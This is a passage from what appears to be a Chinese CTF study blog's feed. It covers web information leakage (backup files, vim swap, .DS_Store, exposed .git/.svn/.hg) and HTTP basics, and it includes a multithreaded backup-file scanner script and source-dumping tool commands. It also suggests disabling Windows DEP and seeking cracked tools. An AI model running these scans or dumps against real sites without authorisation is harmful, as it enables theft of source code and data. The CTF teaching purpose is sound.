                      alt="image-20240921010247506"
                ></p>
<p>当出现上面的情况时，表示数据执行保护被拦截，需要加载打开（原本是为了避免病毒的）</p>
<p>找到“我的电脑”，右击找到“属性”，打开“高级系统设置”，找到“高级”里面的“性能”，打开“设置”，找到“数据执行保护”，根据图中提示，添加“wbStego4.3open.exe”，最后需要重启电脑</p>

  <div class="note p-4 mb-4 rounded-small info fa-solid icon-padding">
    <i class="note-icon fa-solid fa-circle-info"></i><p>做完题之后可以改回去，需要一直使用请在虚拟机操作</p>

  </div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E9%9A%90%E5%86%99%E6%9C%AF/image-20240921010708361.png"
                      alt="image-20240921010708361"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E9%9A%90%E5%86%99%E6%9C%AF/image-20240921010741505.png"
                      alt="image-20240921010741505"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E9%9A%90%E5%86%99%E6%9C%AF/image-20240921010846336.png"
                      alt="image-20240921010846336"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E9%9A%90%E5%86%99%E6%9C%AF/image-20240921010909324.png"
                      alt="image-20240921010909324"
                ></p>
<p><a class="link"   href="https://www.bailer.at/wbstego/" >wbStego4.3open <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>工具不会用的可以参考<a href="/2024/09/20/ctf/writeup/misc/buuctf/%5BPDF%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99%5Dpdf%E9%9A%90%E5%86%99/" title="PDF文档隐写-pdf隐写">[PDF文档隐写]pdf隐写</a></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>隐写术是一个比较混杂的misc安全类，做题时基本是用作其他题型的附加难度，如果题目不提示用隐写术，一定要对图片，音频，视频和文档敏感，不然拿到手都入不了方向</p>
<a href="/2024/09/18/ctf/writeup/misc/%E7%9B%AE%E5%BD%95/catalogue/" title="misc安全WP目录">参考题目目录</a>
]]></content>
      <categories>
        <category>ctf</category>
        <category>data</category>
        <category>misc</category>
      </categories>
      <tags>
        <tag>data</tag>
        <tag>ctf</tag>
        <tag>misc</tag>
      </tags>
  </entry>
  <entry>
    <title>web信息泄露</title>
    <url>/2024/09/26/ctf/data/web/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/</url>
    <content><![CDATA[<h1 id="web信息泄露"><a href="#web信息泄露" class="headerlink" title="web信息泄露"></a>web信息泄露</h1>
  <div class="note p-4 mb-4 rounded-small info">
    <p>在网站开发者开发网站的时候，或多或少会残留一些敏感信息或者文件，特别是对于备份文件和版本控制系统源码泄露尤其常见</p>

  </div>

<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这里会提供一些来自ctfhub的案例，有需要还原的可以看我的博客的关于这一节的题目</p>
<a href="/2024/09/12/ctf/writeup/web/%E7%9B%AE%E5%BD%95/catalogue/" title="web安全WP目录">参考题目目录</a>

<h2 id="工具介绍"><a href="#工具介绍" class="headerlink" title="工具介绍"></a>工具介绍</h2>
  <div class="note p-4 mb-4 rounded-small warning fa-solid icon-padding">
    <i class="note-icon fa-solid fa-circle-exclamation"></i><p>提供的工具若未破解或链接已挂，请自行搜索破解版使用</p>

  </div>

<p><a class="link"   href="https://github.com/maurosoria/dirsearch" >dirsearch <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 网站目录扫描工具</p>
<p><a class="link"   href="https://github.com/lijiejie/GitHack" >GitHack <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> git文件恢复，用于python3，恢复效果一般</p>
<p><a class="link"   href="https://github.com/BugScanTeam/GitHack" >GitHack <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> git文件恢复，用于python2，效果不错</p>
<p><a class="link"   href="https://github.com/admintony/svnExploit.git" >SVNExploit <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> .svn文件恢复，用于python3</p>
<p><a class="link"   href="https://github.com/kost/dvcs-ripper" >dvsc-ripper <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> .svn与.hg文件辅助恢复（kali）</p>
<h2 id="备份文件泄露"><a href="#备份文件泄露" class="headerlink" title="备份文件泄露"></a>备份文件泄露</h2><h3 id="网站源码泄露"><a href="#网站源码泄露" class="headerlink" title="网站源码泄露"></a>网站源码泄露</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/image-20240916154942458.png"
                      alt="image-20240916154942458"
                ></p>
<p>使用<a class="link"   href="https://github.com/VMsec/ihoneyBakFileScan_Modify" >ihoneyBakFileScan_Modify <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>工具或者自编写脚本遍历请求网站目录</p>
<p>这里提供一个本人自己的脚本</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor</span><br><span class="line"></span><br><span class="line"><span class="comment"># url为被扫描地址，后不加‘/’</span></span><br><span class="line"></span><br><span class="line">url1 = <span class="string">&#x27;http://xxx&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 常见的网站源码备份文件名</span></span><br><span class="line"></span><br><span class="line">list1 = [<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="string">&#x27;2010&#x27;</span>, <span class="string">&#x27;2011&#x27;</span>, <span class="string">&#x27;2012&#x27;</span>, <span class="string">&#x27;2013&#x27;</span>, <span class="string">&#x27;2014&#x27;</span>, <span class="string">&#x27;2015&#x27;</span>, <span class="string">&#x27;2016&#x27;</span>, <span class="string">&#x27;2017&#x27;</span>, <span class="string">&#x27;2018&#x27;</span>, <span class="string">&#x27;2019&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;2020&#x27;</span>, <span class="string">&#x27;2021&#x27;</span>, <span class="string">&#x27;2022&#x27;</span>, <span class="string">&#x27;2023&#x27;</span>, <span class="string">&#x27;2024&#x27;</span>, <span class="string">&#x27;2025&#x27;</span>, <span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;archive&#x27;</span>, <span class="string">&#x27;asp&#x27;</span>, <span class="string">&#x27;aspx&#x27;</span>, <span class="string">&#x27;auth&#x27;</span>, <span class="string">&#x27;back&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;backup&#x27;</span>, <span class="string">&#x27;backups&#x27;</span>, <span class="string">&#x27;bak&#x27;</span>, <span class="string">&#x27;bbs&#x27;</span>, <span class="string">&#x27;bin&#x27;</span>, <span class="string">&#x27;clients&#x27;</span>, <span class="string">&#x27;code&#x27;</span>, <span class="string">&#x27;com&#x27;</span>, <span class="string">&#x27;customers&#x27;</span>, <span class="string">&#x27;dat&#x27;</span>, <span class="string">&#x27;data&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;database&#x27;</span>, <span class="string">&#x27;db&#x27;</span>, <span class="string">&#x27;dump&#x27;</span>, <span class="string">&#x27;engine&#x27;</span>, <span class="string">&#x27;error_log&#x27;</span>, <span class="string">&#x27;faisunzip&#x27;</span>, <span class="string">&#x27;files&#x27;</span>, <span class="string">&#x27;forum&#x27;</span>, <span class="string">&#x27;home&#x27;</span>, <span class="string">&#x27;html&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;index&#x27;</span>, <span class="string">&#x27;joomla&#x27;</span>, <span class="string">&#x27;js&#x27;</span>, <span class="string">&#x27;jsp&#x27;</span>, <span class="string">&#x27;local&#x27;</span>, <span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;master&#x27;</span>, <span class="string">&#x27;media&#x27;</span>, <span class="string">&#x27;members&#x27;</span>, <span class="string">&#x27;my&#x27;</span>, <span class="string">&#x27;mysql&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;new&#x27;</span>, <span class="string">&#x27;old&#x27;</span>, <span class="string">&#x27;orders&#x27;</span>, <span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;sales&#x27;</span>, <span class="string">&#x27;site&#x27;</span>, <span class="string">&#x27;sql&#x27;</span>, <span class="string">&#x27;store&#x27;</span>, <span class="string">&#x27;tar&#x27;</span>, <span class="string">&#x27;test&#x27;</span>, <span class="string">&#x27;user&#x27;</span>, <span class="string">&#x27;users&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;vb&#x27;</span>, <span class="string">&#x27;web&#x27;</span>, <span class="string">&#x27;website&#x27;</span>, <span class="string">&#x27;wordpress&#x27;</span>, <span class="string">&#x27;wp&#x27;</span>, <span class="string">&#x27;www&#x27;</span>, <span class="string">&#x27;wwwroot&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;web&#x27;</span>, <span class="string">&#x27;website&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;backup&#x27;</span>, <span class="string">&#x27;back&#x27;</span>, <span class="string">&#x27;www&#x27;</span>, <span class="string">&#x27;wwwroot&#x27;</span>, <span class="string">&#x27;temp&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 常见的网站源码备份文件后缀</span></span><br><span class="line"></span><br><span class="line">list2 = [<span class="string">&#x27;.zip&#x27;</span>, <span class="string">&#x27;.rar&#x27;</span>, <span class="string">&#x27;.tar.gz&#x27;</span>, <span class="string">&#x27;.tgz&#x27;</span>, <span class="string">&#x27;.tar.bz2&#x27;</span>, <span class="string">&#x27;.tar&#x27;</span>, <span class="string">&#x27;.jar&#x27;</span>, <span class="string">&#x27;.war&#x27;</span>, <span class="string">&#x27;.7z&#x27;</span>, <span class="string">&#x27;.bak&#x27;</span>, <span class="string">&#x27;.sql&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;.gz&#x27;</span>, <span class="string">&#x27;.sql.gz&#x27;</span>, <span class="string">&#x27;.tar.tgz&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义一个函数来进行请求，并检查状态码</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_url</span>(<span class="params">file_name</span>):</span><br><span class="line">    url = <span class="string">f&quot;<span class="subst">&#123;url1&#125;</span>/<span class="subst">&#123;file_name&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.get(url)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;file_name&#125;</span>\n&quot;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Error accessing <span class="subst">&#123;url&#125;</span>: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用多线程执行URL请求</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scan_backup_files</span>():</span><br><span class="line">    <span class="keyword">with</span> ThreadPoolExecutor(max_workers=<span class="number">50</span>) <span class="keyword">as</span> executor:  <span class="comment"># 创建50个线程</span></span><br><span class="line">        <span class="comment"># 构造所有的文件名并提交给线程池</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> list1:</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> list2:</span><br><span class="line">                back = <span class="string">f&quot;<span class="subst">&#123;i&#125;</span><span class="subst">&#123;j&#125;</span>&quot;</span>  <span class="comment"># 组合文件名</span></span><br><span class="line">                executor.submit(check_url, back)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 运行扫描</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;能够访问到的网站后缀有:&quot;</span>)</span><br><span class="line">scan_backup_files()</span><br></pre></td></tr></table></figure></div>

<h3 id="bak文件泄露"><a href="#bak文件泄露" class="headerlink" title="bak文件泄露"></a>bak文件泄露</h3><p>尝试直接访问<code>index.php.bak</code>，有文件提示能下载即成功</p>
<h3 id="vim缓存泄露"><a href="#vim缓存泄露" class="headerlink" title="vim缓存泄露"></a>vim缓存泄露</h3><p>尝试访问<code>/.index.php.swp</code>，有文件提示能下载即成功</p>

  <div class="note p-4 mb-4 rounded-small warning">
    <p>隐藏文件，记得加点访问</p>

  </div>

<blockquote>
<p>vim的备份文件后缀位.swp，并且需要用<code>vim 文件名（无.swp）</code>来重新访问，windows直接打开是16进制的，更换编码格式为UTF-8，或者用linux系统打开</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/image-20240917172655327.png"
                      alt="image-20240917172655327"
                ></p>
<h3 id="DS-Store文件泄露"><a href="#DS-Store文件泄露" class="headerlink" title=".DS_Store文件泄露"></a>.DS_Store文件泄露</h3><p>尝试直接访问<code>.DS_Store</code>，有文件提示能下载即成功</p>
<blockquote>
<p>文件需要在linux系统打开，或者在windows系统用UTF-8&#x2F;UTF-16格式打开</p>
</blockquote>
<h2 id="Git泄露"><a href="#Git泄露" class="headerlink" title="Git泄露"></a>Git泄露</h2><p>用网站目录扫描工具，这里演示用的<a class="link"   href="https://github.com/maurosoria/dirsearch" >dirsearch <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>（可以用御剑等等）</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">python dirsearch.py -u 目标地址</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/image-20240912213718118.png"
                      alt="image-20240912213718118"
                ></p>
<p>不用扫描完，扫描到确实有.git的存在，我们就可以试试用工具恢复</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/image-20240912213911928.png"
                      alt="image-20240912213911928"
                ></p>
<p>在工具包目录下面生成了一些文件</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/image-20240912213948091.png"
                      alt="image-20240912213948091"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/image-20240912214334276.png"
                      alt="image-20240912214334276"
                ></p>
<p>但是并没有什么有价值的文件，也没有.git文件</p>
<blockquote>
<p>这是一个坑，要用另一个GitHack.py，并且在python2的环境才可以，建议在kali下运行</p>
<p><a class="link"   href="https://github.com/lijiejie/GitHack" >https://github.com/lijiejie/GitHack <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 用于python3，但恢复效果一般</p>
<p><a class="link"   href="https://github.com/BugScanTeam/GitHack" >https://github.com/BugScanTeam/GitHack <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 用于python2，效果不错</p>
</blockquote>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">python2 GitHack.py 目标地址/.git</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/image-20240912215937518.png"
                      alt="image-20240912215937518"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/image-20240912220043425.png"
                      alt="image-20240912220043425"
                ></p>
<h2 id="SVN泄露"><a href="#SVN泄露" class="headerlink" title="SVN泄露"></a>SVN泄露</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/image-20240913005004198.png"
                      alt="image-20240913005004198"
                ></p>
<p>使用工具<a class="link"   href="https://github.com/admintony/svnExploit.git" >SVNExploit <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>检测目标是否存在SVN泄露（例行检查）</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">python SvnExploit.py -u 目标地址/.svn</span><br></pre></td></tr></table></figure></div>

<p>初次使用会有报错，下载pip包就可以</p>
<blockquote>
<p>或者直接在kali里面使用工具，kali里面的py包很全面</p>
</blockquote>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pip install prettytable -i https://mirrors.tuna.tsinghua.edu.cn/pypi/web/simple</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/image-20240913005735686.png"
                      alt="image-20240913005735686"
                ></p>
<p>再次运行之后可以看到有结果输出，证明有svn泄露</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/image-20240913005921606.png"
                      alt="image-20240913005921606"
                ></p>
<p>在原来的命令后面加上<code>--dump</code>参数，把源码下载下来</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">python SvnExploit.py -u 目标地址/.svn --dump</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/image-20240913010130190.png"
                      alt="image-20240913010130190"
                ></p>
<p>恢复的文件有一个<code>wc.db</code>，是一个数据库文件，可以查看到文件索引</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/image-20240913012737667.png"
                      alt="image-20240913012737667"
                ></p>
<p>使用curl命令访问可以文件检查网页源代码是否存在flag，检查均返回404</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">curl http://challenge-2465e7edfc335d47.sandbox.ctfhub.com:10800/index.html13523.txt</span><br><span class="line">curl http://challenge-2465e7edfc335d47.sandbox.ctfhub.com:10800/flag_135183523.txt</span><br></pre></td></tr></table></figure></div>

<p>根据上面所示，并没有flag文件，也确实没有直接被下载下来，毕竟题上也写了是在旧版本里面，所以使用其他工具进行还原</p>
<p><a class="link"   href="https://github.com/kost/dvcs-ripper" >dvsc-ripper <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>这个工具需要很多环境和包，所以建议在kali里面执行</p>
<p>进入kali，安装工具所需依赖库</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get install perl libio-socket-ssl-perl libdbd-sqlite3-perl libclass-dbi-perl libio-all-lwp-perl</span><br></pre></td></tr></table></figure></div>

<p>安装完后，进入到工具目录，执行</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">./rip-svn.pl -v -u 目标地址/.svn </span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/image-20240913011925973.png"
                      alt="image-20240913011925973"
                ></p>
<p>既然是svn文件，那就会在.svn目录下面，低版本SVN具体路径为text-base目录，高版本SVN为pristine目录，然后层层往下查找，中途肯定会有找不到的时候，可以将文件放到实体机，用文件内容搜索工具搜索flag</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/image-20240913012313165.png"
                      alt="image-20240913012313165"
                ></p>
<h2 id="HG泄露"><a href="#HG泄露" class="headerlink" title="HG泄露"></a>HG泄露</h2><p>和.SVN一样的恢复方式</p>
<p>使用工具，<a class="link"   href="https://github.com/kost/dvcs-ripper" >dvsc-ripper <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>这个工具需要很多环境和包，所以建议在kali里面执行</p>
<p>进入kali，安装工具所需依赖库</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get install perl libio-socket-ssl-perl libdbd-sqlite3-perl libclass-dbi-perl libio-all-lwp-perl</span><br></pre></td></tr></table></figure></div>

<p>安装完后，进入到工具目录，执行</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">./rip-hg.pl -v -u 地址/.hg/</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/image-20240917182029336.png"
                      alt="image-20240917182029336"
                ></p>
<p>进入.hg文件，深度查找flag文件</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/image-20240917182149228.png"
                      alt="image-20240917182149228"
                ></p>
<p>回到靶场添加目录文件即可得到flag</p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>data</category>
        <category>web</category>
      </categories>
      <tags>
        <tag>data</tag>
        <tag>ctf</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>HTTP相关基础资料</title>
    <url>/2024/09/26/ctf/data/web/HTTP%E7%9B%B8%E5%85%B3%E5%9F%BA%E7%A1%80%E8%B5%84%E6%96%99/</url>
    <content><![CDATA[<h1 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这里会提供一些来自buuctf的案例，有需要还原的可以看我的博客的关于这一节的题目</p>
<a href="/2024/09/12/ctf/writeup/web/%E7%9B%AE%E5%BD%95/catalogue/" title="web安全WP目录">参考题目目录</a>

<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p>HTTP是一个客户端和服务器之间请求和应答的标准协议，通常以TCP建立连接。</p>
<h3 id="占用端口"><a href="#占用端口" class="headerlink" title="占用端口"></a>占用端口</h3><p>HTTP-&gt;80端口，HTTPS-&gt;443端口</p>
<h3 id="请求方法"><a href="#请求方法" class="headerlink" title="请求方法"></a>请求方法</h3><table>
<thead>
<tr>
<th align="left">序号</th>
<th align="left">方法</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left"><strong>GET</strong></td>
<td align="left">从服务器获取资源。用于请求数据而不对数据进行更改。例如，从服务器获取网页、图片等。</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left"><strong>POST</strong></td>
<td align="left">向服务器发送数据以创建新资源。常用于提交表单数据或上传文件。发送的数据包含在请求体中。</td>
</tr>
<tr>
<td align="left">3</td>
<td align="left">PUT</td>
<td align="left">向服务器发送数据以更新现有资源。如果资源不存在，则创建新的资源。与 POST 不同，PUT 通常是幂等的，即多次执行相同的 PUT 请求不会产生不同的结果。</td>
</tr>
<tr>
<td align="left">4</td>
<td align="left">DELETE</td>
<td align="left">从服务器删除指定的资源。请求中包含要删除的资源标识符。</td>
</tr>
<tr>
<td align="left">5</td>
<td align="left">PATCH</td>
<td align="left">对资源进行部分修改。与 PUT 类似，但 PATCH 只更改部分数据而不是替换整个资源。</td>
</tr>
<tr>
<td align="left">6</td>
<td align="left">HEAD</td>
<td align="left">类似于 GET，但服务器只返回响应的头部，不返回实际数据。用于检查资源的元数据（例如，检查资源是否存在，查看响应的头部信息）。</td>
</tr>
<tr>
<td align="left">7</td>
<td align="left">OPTIONS</td>
<td align="left">返回服务器支持的 HTTP 方法。用于检查服务器支持哪些请求方法，通常用于跨域资源共享（CORS）的预检请求。</td>
</tr>
<tr>
<td align="left">8</td>
<td align="left">TRACE</td>
<td align="left">回显服务器收到的请求，主要用于诊断。客户端可以查看请求在服务器中的处理路径。</td>
</tr>
<tr>
<td align="left">9</td>
<td align="left">CONNECT</td>
<td align="left">建立一个到服务器的隧道，通常用于 HTTPS 连接。客户端可以通过该隧道发送加密的数据。</td>
</tr>
</tbody></table>
<h3 id="请求状态码"><a href="#请求状态码" class="headerlink" title="请求状态码"></a>请求状态码</h3><p>当浏览者访问一个网页时，浏览者的浏览器会向网页所在服务器发出请求。当浏览器接收并显示网页前，此网页所在的服务器会返回一个包含 HTTP 状态码的信息头（server header）用以响应浏览器的请求。</p>
<p>HTTP 状态码的英文为 <strong>HTTP Status Code</strong>。</p>
<p>下面是常见的 HTTP 状态码格式：</p>
<ul>
<li><strong>1xx（信息性状态码）</strong>：表示接收的请求正在处理。</li>
<li><strong>2xx（成功状态码）</strong>：表示请求正常处理完毕。</li>
<li><strong>3xx（重定向状态码）</strong>：需要后续操作才能完成这一请求。</li>
<li><strong>4xx（客户端错误状态码）</strong>：表示请求包含语法错误或无法完成。</li>
<li><strong>5xx（服务器错误状态码）</strong>：服务器在处理请求的过程中发生了错误。</li>
</ul>
<p><strong>常见状态码</strong></p>
<table>
<thead>
<tr>
<th align="left">状态码</th>
<th align="left">状态码英文名称</th>
<th align="left">中文描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">100</td>
<td align="left">Continue</td>
<td align="left">继续。客户端应继续其请求</td>
</tr>
<tr>
<td align="left">101</td>
<td align="left">Switching Protocols</td>
<td align="left">切换协议。服务器根据客户端的请求切换协议。只能切换到更高级的协议，例如，切换到HTTP的新版本协议</td>
</tr>
<tr>
<td align="left"><strong>200</strong></td>
<td align="left"><strong>OK</strong></td>
<td align="left"><strong>请求成功。一般用于GET与POST请求</strong></td>
</tr>
<tr>
<td align="left">201</td>
<td align="left">Created</td>
<td align="left">已创建。成功请求并创建了新的资源</td>
</tr>
<tr>
<td align="left">202</td>
<td align="left">Accepted</td>
<td align="left">已接受。已经接受请求，但未处理完成</td>
</tr>
<tr>
<td align="left">203</td>
<td align="left">Non-Authoritative Information</td>
<td align="left">非授权信息。请求成功。但返回的meta信息不在原始的服务器，而是一个副本</td>
</tr>
<tr>
<td align="left">204</td>
<td align="left">No Content</td>
<td align="left">无内容。服务器成功处理，但未返回内容。在未更新网页的情况下，可确保浏览器继续显示当前文档</td>
</tr>
<tr>
<td align="left">205</td>
<td align="left">Reset Content</td>
<td align="left">重置内容。服务器处理成功，用户终端（例如：浏览器）应重置文档视图。可通过此返回码清除浏览器的表单域</td>
</tr>
<tr>
<td align="left">206</td>
<td align="left">Partial Content</td>
<td align="left">部分内容。服务器成功处理了部分GET请求</td>
</tr>
<tr>
<td align="left">300</td>
<td align="left">Multiple Choices</td>
<td align="left">多种选择。请求的资源可包括多个位置，相应可返回一个资源特征与地址的列表用于用户终端（例如：浏览器）选择</td>
</tr>
<tr>
<td align="left"><strong>301</strong></td>
<td align="left"><strong>Moved Permanently</strong></td>
<td align="left"><strong>永久移动。请求的资源已被永久的移动到新URI，返回信息会包括新的URI，浏览器会自动定向到新URI。今后任何新的请求都应使用新的URI代替</strong></td>
</tr>
<tr>
<td align="left"><strong>302</strong></td>
<td align="left"><strong>Found</strong></td>
<td align="left"><strong>临时移动。与301类似。但资源只是临时被移动。客户端应继续使用原有URI</strong></td>
</tr>
<tr>
<td align="left">303</td>
<td align="left">See Other</td>
<td align="left">查看其它地址。与301类似。使用GET和POST请求查看</td>
</tr>
<tr>
<td align="left"><strong>304</strong></td>
<td align="left"><strong>Not Modified</strong></td>
<td align="left"><strong>未修改。所请求的资源未修改，服务器返回此状态码时，不会返回任何资源。客户端通常会缓存访问过的资源，通过提供一个头信息指出客户端希望只返回在指定日期之后修改的资源</strong></td>
</tr>
<tr>
<td align="left">305</td>
<td align="left">Use Proxy</td>
<td align="left">使用代理。所请求的资源必须通过代理访问</td>
</tr>
<tr>
<td align="left">306</td>
<td align="left">Unused</td>
<td align="left">已经被废弃的HTTP状态码</td>
</tr>
<tr>
<td align="left">307</td>
<td align="left">Temporary Redirect</td>
<td align="left">临时重定向。与302类似。使用GET请求重定向</td>
</tr>
<tr>
<td align="left">400</td>
<td align="left">Bad Request</td>
<td align="left">客户端请求的语法错误，服务器无法理解</td>
</tr>
<tr>
<td align="left">401</td>
<td align="left">Unauthorized</td>
<td align="left">请求要求用户的身份认证</td>
</tr>
<tr>
<td align="left">402</td>
<td align="left">Payment Required</td>
<td align="left">保留，将来使用</td>
</tr>
<tr>
<td align="left"><strong>403</strong></td>
<td align="left"><strong>Forbidden</strong></td>
<td align="left"><strong>服务器理解请求客户端的请求，但是拒绝执行此请求</strong></td>
</tr>
<tr>
<td align="left"><strong>404</strong></td>
<td align="left"><strong>Not Found</strong></td>
<td align="left"><strong>服务器无法根据客户端的请求找到资源（网页）。通过此代码，网站设计人员可设置”您所请求的资源无法找到”的个性页面</strong></td>
</tr>
<tr>
